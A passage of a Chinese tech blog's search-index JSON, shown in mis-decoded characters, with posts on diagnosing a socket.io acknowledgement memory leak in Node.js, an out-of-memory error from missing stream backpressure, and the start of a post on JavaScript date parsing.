æˆ‘ä»¬å±•å¼€arrayè¿™ä¸€åˆ—ï¼Œå¯ä»¥å‘ç°æœ‰å¾ˆå¤šçš„distanceæ˜¯15çš„å¯¹è±¡ã€‚ç„¶åæˆ‘ä»¬å±•å¼€å…¶ä¸­ä¸€ä¸ªå¯¹è±¡åã€‚\nå¯ä»¥å‘ç°ä»è·ç¦»æ˜¯14åˆ°1ä¹‹é—´çš„ä¿ç•™è·¯å¾„ã€‚\nå±•å¼€ä¸€ä¸ªå¯¹è±¡ä¹‹åï¼Œå‘ç°æœ‰å¾ˆå¤šackClientï¼Œè¿™ä¸ªackClientå®é™…ä¸Šå¯¹åº”äº†ä»£ç é‡Œæˆ‘å†™çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥ç¡®è®¤æ¶ˆæ¯æ˜¯å¦è¢«å®¢æˆ·ç«¯æ”¶åˆ°çš„ã€‚è¿™ä¸ªç¡®è®¤æœºåˆ¶æ˜¯socket.ioæä¾›çš„ã€‚\nå½“æˆ‘ç¡®è®¤å†…å­˜æ³„æ¼æ˜¯socket.ioçš„ç¡®è®¤æœºåˆ¶çš„é—®é¢˜åï¼Œæˆ‘å°±å°†ç¡®è®¤çš„å‡½æ•°ä»ä»£ç ä¸­ç§»é™¤ï¼Œæ”¹ä¸ºæ¶ˆæ¯ä¸ç¡®è®¤ã€‚åœ¨ä¸€æ®µæ—¶é—´çš„å‹æµ‹è¿‡åï¼ŒæœåŠ¡çš„å†…å­˜è¶‹äºç¨³å®šï¼Œçœ‹æ¥é—®é¢˜å·²ç»å®šä½äº†ã€‚\nsocket.ioå†…å­˜æ³„æ¼çš„åŸå›  åœ¨é˜…è¯»äº†socket.ioçš„æºç ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªSocketå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªackså¯¹è±¡ç”¨æ¥è¡¨ç¤ºç¡®è®¤ã€‚\nfunction Socket(nsp, client, query){ this.nsp = nsp; this.server = nsp.server; this.adapter = this.nsp.adapter; this.id = nsp.name !== \u0026#39;/\u0026#39; ? nsp.name + \u0026#39;#\u0026#39; + client.id : client.id; this.client = client; this.conn = client.conn; this.rooms = {}; this.acks = {}; this.connected = true; this.disconnected = false; this.handshake = this.buildHandshake(query); this.fns = []; this.flags = {}; this._rooms = []; } åœ¨è°ƒç”¨socket.emit()æ–¹æ³•æ—¶ï¼Œsocket.ioä¼šå°†æ¶ˆæ¯çš„idé™„ç€åœ¨ackså¯¹è±¡ä¸Šï¼Œå¯ä»¥æƒ³è±¡ï¼Œéšç€æ¶ˆæ¯å‘é€çš„é‡å¢å¤§ï¼Œè¿™ä¸ªacksçš„å±æ€§å°†ä¼šè¶Šæ¥è¶Šå¤šã€‚\nif (typeof args[args.length - 1] === \u0026#39;function\u0026#39;) { if (this._rooms.length || this.flags.broadcast) { throw new Error(\u0026#39;Callbacks are not supported when broadcasting\u0026#39;); } debug(\u0026#39;emitting packet with ack id %d\u0026#39;, this.nsp.ids); this.acks[this.nsp.ids] = args.pop(); packet.id = this.nsp.ids++; } å½“æ”¶åˆ°ackä¹‹åï¼Œacksä¸Šå¯¹åº”çš„åŒ…çš„å±æ€§æ‰ä¼šè¢«åˆ æ‰ã€‚\nSocket.prototype.onack = function(packet){ var ack = this.acks[packet.id]; if (\u0026#39;function\u0026#39; == typeof ack) { debug(\u0026#39;calling ack %s with %j\u0026#39;, packet.id, packet.data); ack.apply(this, packet.data); delete this.acks[packet.id]; } else { debug(\u0026#39;bad ack %s\u0026#39;, packet.id); } }; å¦‚æœå®¢æˆ·ç«¯ä¸å¯¹æ¶ˆæ¯è¿›è¡Œackç¡®è®¤ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å°±ä¼šç§¯ç´¯éå¸¸å¤šçš„å¾…ç¡®è®¤çš„æ¶ˆæ¯ï¼Œæœ€ç»ˆå¯¼è‡´å†…å­˜æ³„æ¼ã€‚\nè™½ç„¶è¿™ä¸ªé—®é¢˜çš„æœ€ç»ˆåŸå› æ˜¯å®¢æˆ·ç«¯æ²¡æœ‰åŠæ—¶ç¡®è®¤ï¼Œä½†æ˜¯æŸ¥çœ‹ä¸€ä¸‹socket.ioçš„é¡¹ç›®ï¼Œå‘ç°å·²ç»æœ‰å°†è¿‘500ä¸ªissueæ²¡æœ‰è§£å†³ã€‚æˆ‘è§‰å¾—æœ‰æ—¶é—´çš„è¯ï¼Œæˆ‘ä¼šç”¨åŸç”Ÿçš„websocketæ›¿æ¢æ‰socket.ioã€‚ä¸ç„¶è¿™ä¸ªsocket.ioå¾ˆå¯èƒ½å›æˆä¸ºé¡¹ç›®çš„ä¸€ä¸ªç“¶é¢ˆç‚¹ã€‚\nå‚è€ƒèµ„æ–™ http://slides.com/gruizdevilla/memory http://bmeck.github.io/snapshot-utils/doc/manual/terms.html https://nodejs.org/dist/latest-v12.x/docs/api/v8.html#v8_v8_writeheapsnapshot_filename https://github.com/socketio/socket.io/issues/3494 ","permalink":"https://wdd.js.org/fe/memory-leak-sharing/","summary":"ä»€ä¹ˆæ˜¯å†…å­˜æ³„æ¼ï¼Ÿ å•ä½æ—¶é—´å†…çš„å†…å­˜å˜åŒ–é‡å¯èƒ½æœ‰ä¸‰ä¸ªå€¼\næ­£æ•°ï¼šå†…å­˜å¯èƒ½å­˜åœ¨æ³„æ¼ã€‚ç”Ÿäº§ç¯å¢ƒï¼Œå¦‚æœæœåŠ¡åœ¨å¯åŠ¨åï¼Œè¯¥å€¼ä¸€ç›´æ˜¯æ­£å€¼ï¼Œä»æœªå‡ºç°è´Ÿå€¼æˆ–è€…è¶‹è¿‘äº0çš„å€¼ï¼Œé‚£ä¹ˆæå¤§çš„å¯èƒ½æ˜¯å­˜åœ¨å†…å­˜æ³„æ¼çš„ã€‚ è¶‹è¿‘äº0çš„å€¼: å†…å­˜ç¨³å®šç»´æŒ è´Ÿæ•°ï¼šå†…å­˜åœ¨é‡Šæ”¾ å®é™…ä¸Šï¼Œåœ¨è§‚å¯Ÿå†…å­˜å˜åŒ–é‡æ—¶ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‰ææ¡ä»¶\nä¸€å®šçš„è´Ÿè½½å‹åŠ›ï¼šå› ä¸ºåœ¨å¼€å‘æˆ–è€…åŠŸèƒ½æµ‹è¯•ç¯å¢ƒï¼Œå¾ˆå°‘çš„ç”¨æˆ·ï¼ŒæœåŠ¡çš„å‹åŠ›å¾ˆå°ï¼Œæ˜¯å¾ˆéš¾è§‚æµ‹åˆ°å†…å­˜æ³„æ¼é—®é¢˜çš„ã€‚æ‰€ä»¥åŠ¡å¿…åœ¨ä¸€å®šçš„è´Ÿè½½å‹åŠ›ä¸‹è§‚æµ‹ã€‚ è‡³å°‘è¦è§‚æµ‹ä¸€å¤©ï¼šå†…å­˜ä¸Šæ¶¨å¹¶ä¸ä¸€å®šæ„å‘³ç€å­˜åœ¨å†…å­˜æ³„æ¼é—®é¢˜ã€‚åœ¨ä¸€ä¸ªå·¥ä½œæ—¥ä¸­ï¼ŒæŸäº›æ—¶é—´ç‚¹ï¼Œæ˜¯ç”¨æˆ·ä½¿ç”¨çš„é«˜å³°æœŸï¼ŒæœåŠ¡çš„è´Ÿè½½å¾ˆé«˜ï¼Œè‡ªç„¶å†…å­˜ä½¿ç”¨ä¼šå¢é•¿ã€‚å…³é”®åœ¨äºåœ¨é«˜å³°æœŸè¿‡åçš„ä½è°·æœŸæ—¶ï¼Œå†…å­˜æ˜¯å¦å›ä¸‹é™åˆ°æ­£å¸¸å€¼ã€‚å¦‚æœå†…å­˜åœ¨ä½è°·æœŸæ—¶ä¾ç„¶ç»´æŒç€é«˜å³°æœŸæ—¶çš„å†…å­˜ä½¿ç”¨ï¼Œé‚£ä¹ˆéå¸¸å¤§å¯èƒ½æ˜¯å­˜åœ¨å†…å­˜æ³„æ¼äº†ã€‚ ä¸‹å›¾æ˜¯ä¸¤ä¸ªæœåŠ¡çš„ã€‚ä»ç¬¬ä¸€å¤©çš„0ç‚¹å¼€å§‹è§‚æµ‹æœåŠ¡çš„å†…å­˜ï¼Œä¸€ç›´åˆ°ç¬¬äºŒå¤©çš„12ç‚¹ã€‚æ­£å¸¸çš„æœåŠ¡ä¼šéšç€è´Ÿè½½çš„å‹åŠ›å¢åŠ æˆ–è€…å‡å°‘å†…å­˜ä½¿ç”¨ã€‚è€Œå­˜åœ¨å†…å­˜æ³„æ¼çš„æœåŠ¡ï¼Œå†…å­˜ä¸€ç›´åœ¨ä¸Šå‡ï¼Œå¹¶ä¸”è´Ÿè½½å‹åŠ›è¶Šå¤§ï¼Œä¸Šå‡çš„è¶Šå¿«ã€‚\næœ‰æ²¡æœ‰å¯èƒ½é¿å…å†…å­˜æ³„æ¼ï¼Ÿ é™¤éä½ ä¸å†™ä»£ç ï¼Œå¦è€…ä½ æ˜¯æ— æ³•é¿å…å†…å­˜æ³„æ¼çš„é—®é¢˜çš„ã€‚\nç¬¬ä¸€ï¼Œå³ä½¿ä½ æ˜¯éå¸¸ç²¾é€šæŸä¸ªè¯­è¨€ï¼Œä¹Ÿæ˜¯æœ‰å¾ˆå¤šå…³äºå¦‚ä½•é¿å…å†…å­˜æ³„æ¼çš„ç»éªŒã€‚ä½†æ˜¯ä½ çš„ä»£ç é‡Œä»ç„¶å¯èƒ½ä¼šåŒ…å«å…¶ä»–åº“æˆ–è€…å…¶ä»–åŒäº‹å†™çš„ä»£ç ï¼Œé‚£äº›ä»£ç é‡Œæ˜¯æ— æ³•ä¿è¯æ˜¯å¦å­˜åœ¨å†…å­˜æ³„æ¼é—®é¢˜çš„ã€‚ ç¬¬äºŒï¼Œå†…å­˜æ³„æ¼çš„ä»£ç æœ‰æ—¶å€™éå¸¸éš¾ä»¥å¯Ÿè§‰ã€‚ä¾‹å¦‚console.logæ‰“å°çš„å¤ªå¿«ï¼Œå ç”¨å¤ªå¤šçš„bufferã€‚ç½‘ç»œæµé‡æ¿€å¢ï¼Œå ç”¨å¤ªå¤šçš„Recv_Qï¼Œnodeæ— æ³•åŠæ—¶å¤„ç†ã€‚å†™æ–‡ä»¶å¤ªæ…¢ï¼Œæ²¡æœ‰å¤„ç†â€œåå‹â€ç›¸å…³çš„é€»è¾‘ç­‰ç­‰ã€‚\nä¸ºä»€ä¹ˆè¦å…³æ³¨å†…å­˜æ³„æ¼ï¼Ÿ ä¸ºä»€ä¹ˆè¦å…³æ³¨å†…å­˜æ³„æ¼ï¼Ÿæˆ‘ä»¬å®¢æˆ·çš„æœåŠ¡å™¨å¯æ˜¯æœ‰500Gå†…å­˜çš„\nä½ å¯èƒ½æœ‰ä¸ªå¾ˆè±ªçš„é‡‘ä¸»ã€‚ä½†æ˜¯ä½ ä¸è¦å¿˜è®°ä¸€ä¸ªæ•…äº‹ã€‚\nä¼ è¯´å›½é™…è±¡æ£‹æ˜¯ç”±ä¸€ä½å°åº¦æ•°å­¦å®¶å‘æ˜çš„ã€‚å›½ç‹ååˆ†æ„Ÿè°¢è¿™ä½æ•°å­¦å®¶ï¼Œäºæ˜¯å°±è¯·ä»–è‡ªå·±è¯´å‡ºæƒ³è¦å¾—åˆ°ä»€ä¹ˆå¥–èµã€‚è¿™ä½æ•°å­¦å®¶æƒ³äº†ä¸€åˆ†é’Ÿåå°±æå‡ºè¯·æ±‚â€”â€”æŠŠ1ç²’ç±³æ”¾åœ¨æ£‹ç›˜çš„ç¬¬1æ ¼é‡Œï¼Œ2ç²’ç±³æ”¾åœ¨ç¬¬2æ ¼ï¼Œ4ç²’ç±³æ”¾åœ¨ç¬¬3æ ¼ï¼Œ8ç²’ç±³æ”¾åœ¨ç¬¬4æ ¼ï¼Œä¾æ¬¡ç±»æ¨ï¼Œæ¯ä¸ªæ–¹æ ¼ä¸­çš„ç±³ç²’æ•°é‡éƒ½æ˜¯ä¹‹å‰æ–¹æ ¼ä¸­çš„ç±³ç²’æ•°é‡çš„2å€ã€‚\nå›½ç‹æ¬£ç„¶åº”å…ï¼Œè¯§å¼‚äºæ•°å­¦å®¶ç«Ÿç„¶åªæƒ³è¦è¿™ä¹ˆä¸€ç‚¹çš„èµèµâ€”â€”ä½†éšåå´å¤§åƒäº†ä¸€æƒŠã€‚å½“ä»–å¼€å§‹å«äººæŠŠç±³æ”¾åœ¨æ£‹ç›˜ä¸Šæ—¶ï¼Œæœ€åˆå‡ ä¸ªæ–¹æ ¼ä¸­çš„ç±³ç²’å°‘å¾—åƒå‡ ä¹ä¸å­˜åœ¨ä¸€æ ·ã€‚ä½†æ˜¯ï¼Œå¾€ç¬¬16ä¸ªæ–¹æ ¼ä¸Šæ”¾ç±³ç²’æ—¶ï¼Œå°±éœ€è¦æ‹¿å‡º1å…¬æ–¤çš„å¤§ç±³ã€‚è€Œåˆ°äº†ç¬¬20æ ¼æ—¶ï¼Œä»–çš„é‚£äº›ä»†äººåˆ™éœ€è¦æ¨æ¥æ»¡æ»¡ä¸€æ‰‹æ¨è½¦çš„ç±³ã€‚å›½ç‹æ ¹æœ¬æ— æ³•æä¾›è¶³å¤Ÿçš„å¤§ç±³æ”¾åœ¨æ£‹ç›˜ä¸Šçš„ç¬¬64æ ¼ä¸Šå»ã€‚å› ä¸ºæ­¤æ—¶ï¼Œæ£‹ç›˜ä¸Šç±³ç²’çš„æ•°é‡ä¼šè¾¾åˆ°æƒŠäººçš„18 446 744 073 709 551 615ç²’ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¼¦æ•¦å¸‚ä¸­å¿ƒå†ç°è¿™ä¸€æ¸¸æˆï¼Œé‚£ä¹ˆç¬¬64æ ¼ä¸­çš„ç±³å †å°†å»¶ä¼¸è‡³M25ç¯åŸå…¬è·¯ï¼Œå…¶é«˜åº¦å°†è¶…è¿‡æ‰€æœ‰å»ºç­‘çš„é«˜åº¦ã€‚äº‹å®ä¸Šï¼Œè¿™ä¸€å †ç±³ç²’æ¯”è¿‡å»1000å¹´æ¥å…¨çƒå¤§ç±³çš„ç”Ÿäº§æ€»é‡è¿˜è¦å¤šå¾—å¤šã€‚\nå¯¹äºå†…å­˜æ³„æ¼æ¥è¯´ï¼Œå¯èƒ½500Géƒ½æ˜¯ä¸å¤Ÿç”¨çš„ã€‚\nå®é™…ä¸Šæ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹ä½¿ç”¨å†…å­˜èµ„æºæ˜¯æœ‰é™åˆ¶çš„ï¼Œæˆ‘ä»¬å…³æ³¨å†…å­˜æ³„æ¼ï¼Œå®é™…ä¸Šæ˜¯å…³æ³¨å†…å­˜æ³„æ¼ä¼šå¼•èµ·çš„æœ€ç»ˆé—®é¢˜ï¼šout of memoryã€‚å¦‚æœè¿›ç¨‹ä½¿ç”¨çš„èµ„æºæ•°å¼•èµ·äº†æ“ä½œç³»ç»Ÿçš„æ³¨æ„ï¼Œå¾ˆå¯èƒ½è¿›ç¨‹è¢«æ“ä½œç³»ç»Ÿæ€æ­»ã€‚\nç„¶åä½ çš„å®¢æˆ·å¯èƒ½æ­£åœ¨ä½¿ç”¨ä½ çš„æœåŠ¡å®Œæˆä¸€ä¸ªé‡è¦çš„äº‹æƒ…ï¼Œæ¥ç€ä½ ä»¬çš„å®¢æˆ·æŠ•è¯‰çƒ­çº¿å›è¢«æ‰“çˆ†ï¼Œç„¶åæ˜¯ä½ çš„è€æ¿ï¼Œä½ çš„é¢†å¯¼æ‰¾ä½ è°ˆè¯~~~\nåŸºæœ¬ç±»å‹ vs å¼•ç”¨ç±»å‹ åŸºæœ¬ç±»å‹ï¼šundefined, null, boolean, number, stringã€‚åŸºæœ¬ç±»å‹æ˜¯æŒ‰å€¼è®¿é—® å¼•ç”¨ç±»å‹çš„å€¼å®é™…ä¸Šæ˜¯æŒ‡å‘å†…å­˜ä¸­çš„å¯¹è±¡ ä¸Šé¢çš„è¯´æ³•æ¥è‡ªã€ŠJavaScripté«˜çº§ç¨‹åºè®¾è®¡ã€‹ã€‚ä½†æ˜¯å¯¹äºåŸºæœ¬ç±»å‹å­—ç¬¦ä¸²çš„å®šä¹‰ï¼Œå®é™…ä¸Šæˆ‘æ˜¯æœ‰äº›ä¸è®¤åŒçš„ã€‚æœ‰äº›äººä¹Ÿè®¤ä¸ºå­—ç¬¦ä¸²ä¸å±äºåŸºæœ¬ç±»å‹ã€‚\nå°±æ˜¯å…³äºå­—ç¬¦ä¸²ï¼Œæˆ‘æ›¾æ€è€ƒè¿‡ï¼Œåœ¨JavaScripté‡Œï¼Œå­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦æ˜¯å¤šå°‘ï¼Œå­—ç¬¦ä¸²æœ€å¤šèƒ½è£…ä¸‹å¤šå°‘ä¸ªå­—ç¬¦ï¼Ÿ\næˆ‘ä¸ªäººè®¤ä¸ºï¼Œä¸€ä¸ªå˜é‡æœ‰å›ºå®šçš„å¤§å°çš„å†…å­˜å ç”¨ï¼Œæ‰æ˜¯åŸºæœ¬ç±»å‹ã€‚ä¾‹å¦‚æ•°å­—ï¼Œnull, å¸ƒå°”å€¼ï¼Œè¿™äº›å€¼å¾ˆå®¹æ˜“èƒ½ç†è§£ä»–ä»¬ä¼šå ç”¨å›ºå®šçš„å†…å­˜å¤§å°ã€‚ä½†æ˜¯å­—ç¬¦ä¸²å°±ä¸ä¸€æ ·äº†ã€‚å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯ä¸å›ºå®šï¼Œåœ¨ä¸åŒçš„æµè§ˆå™¨ä¸­ï¼Œæœ‰äº›å­—ç¬¦ä¸²æœ€å¤§å¯èƒ½å ç”¨256Mçš„å†…å­˜ï¼Œç”šè‡³æ›´å¤šã€‚\nå¯ä»¥å‚è€ƒè¿™ä¸ªé—®é¢˜ï¼šhttps://stackoverflow.com/questions/34957890/javascript-string-size-limit-256-mb-for-me-is-it-the-same-for-all-browsers\nå†…å­˜æ˜¯ä¸€å¼ å›¾ 1ä»£è¡¨æ ¹èŠ‚ç‚¹ï¼Œåœ¨NodeJSé‡Œæ˜¯globalå¯¹è±¡ï¼Œåœ¨æµè§ˆå™¨ä¸­æ˜¯windowå¯¹è±¡ 2-6ä»£è¡¨å¯¹è±¡ 7-8ä»£è¡¨åŸå§‹ç±»å‹ã€‚åˆ†åˆ«æœ‰ä¸‰ç§ï¼Œå­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”å€¼ 9-10ä»£è¡¨ä»æ ¹èŠ‚ç‚¹æ— æ³•åˆ°è¾¾çš„å¯¹è±¡ æ³¨æ„ï¼Œä½œä¸ºåŸå§‹ç±»å‹çš„å€¼ï¼Œåœ¨å†…å­˜å›¾ä¸­åªèƒ½æ˜¯å¶å­èŠ‚ç‚¹ã€‚ ** ä»è·ŸèŠ‚ç‚¹R0æ— æ³•åˆ°è¾¾çš„èŠ‚ç‚¹9,10ï¼Œå°†ä¼šåœ¨GCæ—¶è¢«æ¸…é™¤ã€‚\nä¿ç•™è·¯å¾„çš„å«ä¹‰æ˜¯ä»è·Ÿå¯¹è±¡åˆ°æŸä¸€èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ä¾‹å¦‚1-\u0026gt;2-\u0026gt;4-\u0026gt;6ã€‚\nå¯¹è±¡ä¿ç•™æ ‘ èŠ‚ç‚¹ï¼š æ„é€ å‡½æ•°çš„åç§° è¾¹ç¼˜ï¼šå¯¹è±¡çš„key è·ç¦»: èŠ‚ç‚¹åˆ°è·ŸèŠ‚ç‚¹çš„æœ€çŸ­è·ç¦» æ”¯é…é¡¹(Dominators) æ¯ä¸ªå¯¹è±¡æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ”¯é…é¡¹ å¦‚æœBå­˜åœ¨ä»æ ¹èŠ‚ç‚¹åˆ°AèŠ‚ç‚¹ä¹‹é—´çš„æ‰€æœ‰è·¯å¾„ä¸­ï¼Œé‚£ä¹ˆBæ˜¯Açš„æ”¯é…é¡¹ï¼Œå³Bæ”¯é…Aã€‚ ä¸‹å›¾ä¸­\n1æ”¯é…2 2æ”¯é…3,4,6 (æƒ³æƒ³2ä¸ºä»€ä¹ˆæ²¡æœ‰æ”¯é…5ï¼Ÿ) 3æ”¯é…5 6æ”¯é…7 5æ”¯é…8 ç†è§£æ”¯é…é¡¹çš„æ„ä¹‰åœ¨äºç†è§£å¦‚ä½•å°†èµ„æºé‡Šæ”¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¦‚æœç›®æ ‡æ˜¯é‡Šæ”¾èŠ‚ç‚¹6çš„å ç”¨èµ„æºï¼Œä»…ä»…é‡Šæ”¾èŠ‚ç‚¹3æˆ–è€…èŠ‚ç‚¹4æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¿…éœ€é‡Šæ”¾å…¶æ”¯é…é¡¹èŠ‚ç‚¹2ï¼Œæ‰èƒ½å°†èŠ‚ç‚¹6é‡Šæ”¾ã€‚ å¯¹è±¡å¤§å° å¯¹è±¡è‡ªèº«å ç”¨å¤§å°ï¼šshadow size é€šè¿‡ä¿æŒå¯¹å…¶ä»–å¯¹è±¡çš„å¼•ç”¨éšå¼å ç”¨ï¼Œè¿™ç§æ–¹å¼å¯ä»¥é˜»æ­¢è¿™äº›å¯¹è±¡è¢«åƒåœ¾å›æ”¶å™¨ï¼ˆç®€ç§° GCï¼‰è‡ªåŠ¨å¤„ç½® å¯¹è±¡çš„å¤§å°çš„å•ä½æ˜¯å­—èŠ‚ åˆ†æå·¥å…· heapsnapshot import {writeHeapSnapshot} from \u0026#39;v8\u0026#39; router.","title":"JSå†…å­˜æ³„æ¼åˆ†äº«"},{"content":"ä»Šå¤©æˆ‘æ”¶é›†äº†ä¸€ä»½å¤§æ¦‚æœ‰40ä¸‡è¡Œçš„æ—¥å¿—ï¼Œä¸ºäº†å……åˆ†åˆ©ç”¨è¿™ä»½æ—¥å¿—ï¼Œæˆ‘å†³å®šæŠŠæ—¥å¿—ç»™è§£æï¼Œè§£æå®Œäº†ä¹‹åï¼Œå†å†™å…¥mysqlæ•°æ®åº“ã€‚\né¦–å…ˆï¼Œå¯¹äº40ä¸‡è¡Œçš„æ—¥å¿—ï¼Œè‚¯å®šä¸èƒ½ä¸€æ¬¡æ€§è¯»å–åˆ°å†…å­˜ã€‚\næ‰€ä»¥æˆ‘ç”¨äº†NodeJså†…ç½®çš„readlineæ¨¡å—ã€‚\nconst readline = require(\u0026#39;readline\u0026#39;) let line_no = 0 let rl = readline.createInterface({ input: fs.createReadStream(\u0026#39;./my.log\u0026#39;) }) rl.on(\u0026#39;line\u0026#39;, function(line) { line_no++; console.log(line) }) // end rl.on(\u0026#39;close\u0026#39;, function(line) { console.log(\u0026#39;Total lines : \u0026#39; + line_no); }) æ•°æ®è§£æä»¥åŠå†™å…¥åˆ°è¿™å—æˆ‘æ²¡æœ‰è´´ä»£ç ã€‚ä»£ç çš„æ‰§è¡Œæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯ä¸€æ®µæ—¶é—´ä¹‹åï¼Œç¨‹åºå°±æŠ¥é”™Out Of Memoryã€‚\nä»£ç æ‰§è¡Œæ˜¯åœ¨nodejs 10.16.3ä¸Šè¿è¡Œçš„ï¼Œè°·æ­Œæœäº†ä¸€ä¸‹è§£å†³æ–¹æ¡ˆï¼Œçœ‹åˆ°æœ‰äººè¯´nodejså‡çº§åˆ°12.xç‰ˆæœ¬å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘æŠ±ç€è¯•è¯•çœ‹çš„æƒ³æ³•ï¼Œå‡çº§äº†nodejsåˆ°æœ€æ–°ç‰ˆï¼Œæœç„¶æ²¡æœ‰å†å‡ºç°OOMçš„é—®é¢˜ã€‚\nåæ¥æˆ‘æƒ³ï¼Œæˆ‘ç»ˆäºæ·±åˆ»ç†è§£äº†NodeJSå®˜ç½‘ä¸Šçš„è¿™ç¯‡æ–‡ç« Â Backpressuring in Streamsï¼Œä»¥å‰æˆ‘ä¹Ÿåº¦è¿‡å‡ éï¼Œä½†æ˜¯ä¸å¤ªäº†è§£ï¼Œè¿™æ¬¡æ¥åˆå®é™…æƒ…å†µã€‚æœ‰äº†æ·±åˆ»ç†è§£ã€‚\nNodeJSåœ¨æŒ‰è¡Œè¯»å–æœ¬åœ°æ–‡ä»¶æ—¶ï¼Œå¤§æ¦‚å¯ä»¥è¾¾åˆ°æ¯ç§’1000è¡Œçš„é€Ÿåº¦ï¼Œç„¶è€Œæ•°æ®å†™å…¥åˆ°MySqlï¼Œå¤§æ¦‚æ¯ç§’100æ¬¡æ’å…¥çš„æ ·å­ã€‚\næœ¬èº«ç½‘ç»œä¸Šå­˜åœ¨çš„å»¶è¿Ÿå°±è¦æ¯”è¯»å–æœ¬åœ°ç£ç›˜è¦æ…¢ï¼Œè¯»åˆ°å¤ªå¤šçš„æ•°æ®æ— æ³•å¤„ç†ï¼Œåªèƒ½æš‚æ—¶ç§¯å‹åˆ°å†…å­˜ä¸­ï¼Œç„¶è€Œå†…å­˜æœ‰é™ï¼Œæœ€ç»ˆOOMçš„å¼‚å¸¸å°±æŠ›å‡ºäº†ã€‚\nNodeJS 12.xåº”è¯¥è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\nå‚è€ƒ https://nodejs.org/en/docs/guides/backpressuring-in-streams/ ","permalink":"https://wdd.js.org/fe/oom-backpressuring-in-streams/","summary":"ä»Šå¤©æˆ‘æ”¶é›†äº†ä¸€ä»½å¤§æ¦‚æœ‰40ä¸‡è¡Œçš„æ—¥å¿—ï¼Œä¸ºäº†å……åˆ†åˆ©ç”¨è¿™ä»½æ—¥å¿—ï¼Œæˆ‘å†³å®šæŠŠæ—¥å¿—ç»™è§£æï¼Œè§£æå®Œäº†ä¹‹åï¼Œå†å†™å…¥mysqlæ•°æ®åº“ã€‚\né¦–å…ˆï¼Œå¯¹äº40ä¸‡è¡Œçš„æ—¥å¿—ï¼Œè‚¯å®šä¸èƒ½ä¸€æ¬¡æ€§è¯»å–åˆ°å†…å­˜ã€‚\næ‰€ä»¥æˆ‘ç”¨äº†NodeJså†…ç½®çš„readlineæ¨¡å—ã€‚\nconst readline = require(\u0026#39;readline\u0026#39;) let line_no = 0 let rl = readline.createInterface({ input: fs.createReadStream(\u0026#39;./my.log\u0026#39;) }) rl.on(\u0026#39;line\u0026#39;, function(line) { line_no++; console.log(line) }) // end rl.on(\u0026#39;close\u0026#39;, function(line) { console.log(\u0026#39;Total lines : \u0026#39; + line_no); }) æ•°æ®è§£æä»¥åŠå†™å…¥åˆ°è¿™å—æˆ‘æ²¡æœ‰è´´ä»£ç ã€‚ä»£ç çš„æ‰§è¡Œæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯ä¸€æ®µæ—¶é—´ä¹‹åï¼Œç¨‹åºå°±æŠ¥é”™Out Of Memoryã€‚\nä»£ç æ‰§è¡Œæ˜¯åœ¨nodejs 10.16.3ä¸Šè¿è¡Œçš„ï¼Œè°·æ­Œæœäº†ä¸€ä¸‹è§£å†³æ–¹æ¡ˆï¼Œçœ‹åˆ°æœ‰äººè¯´nodejså‡çº§åˆ°12.xç‰ˆæœ¬å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘æŠ±ç€è¯•è¯•çœ‹çš„æƒ³æ³•ï¼Œå‡çº§äº†nodejsåˆ°æœ€æ–°ç‰ˆï¼Œæœç„¶æ²¡æœ‰å†å‡ºç°OOMçš„é—®é¢˜ã€‚\nåæ¥æˆ‘æƒ³ï¼Œæˆ‘ç»ˆäºæ·±åˆ»ç†è§£äº†NodeJSå®˜ç½‘ä¸Šçš„è¿™ç¯‡æ–‡ç« Â Backpressuring in Streamsï¼Œä»¥å‰æˆ‘ä¹Ÿåº¦è¿‡å‡ éï¼Œä½†æ˜¯ä¸å¤ªäº†è§£ï¼Œè¿™æ¬¡æ¥åˆå®é™…æƒ…å†µã€‚æœ‰äº†æ·±åˆ»ç†è§£ã€‚\nNodeJSåœ¨æŒ‰è¡Œè¯»å–æœ¬åœ°æ–‡ä»¶æ—¶ï¼Œå¤§æ¦‚å¯ä»¥è¾¾åˆ°æ¯ç§’1000è¡Œçš„é€Ÿåº¦ï¼Œç„¶è€Œæ•°æ®å†™å…¥åˆ°MySqlï¼Œå¤§æ¦‚æ¯ç§’100æ¬¡æ’å…¥çš„æ ·å­ã€‚\næœ¬èº«ç½‘ç»œä¸Šå­˜åœ¨çš„å»¶è¿Ÿå°±è¦æ¯”è¯»å–æœ¬åœ°ç£ç›˜è¦æ…¢ï¼Œè¯»åˆ°å¤ªå¤šçš„æ•°æ®æ— æ³•å¤„ç†ï¼Œåªèƒ½æš‚æ—¶ç§¯å‹åˆ°å†…å­˜ä¸­ï¼Œç„¶è€Œå†…å­˜æœ‰é™ï¼Œæœ€ç»ˆOOMçš„å¼‚å¸¸å°±æŠ›å‡ºäº†ã€‚\nNodeJS 12.xåº”è¯¥è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\nå‚è€ƒ https://nodejs.org/en/docs/guides/backpressuring-in-streams/ ","title":"NodeJS Out of Memory: Backpressuring in Streams"},{"content":"ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå»ºè®®ä½ ä¸è¦ç”¨new Date(\u0026ldquo;time string\u0026rdquo;)çš„æ–¹å¼å»åšæ—¶é—´è§£æã€‚å› ä¸ºä¸åŒæµè§ˆå™¨ï¼Œå¯èƒ½æ¥å—çš„time stringçš„æ ¼å¼éƒ½ä¸ä¸€æ ·ã€‚\nä½ æœ€å¥½ä¸è¦å»å…ˆå…¥ä¸ºä¸»ï¼Œè®¤ä¸ºæµè§ˆå™¨ä¼šæ”¯æŒçš„ä½ çš„æ 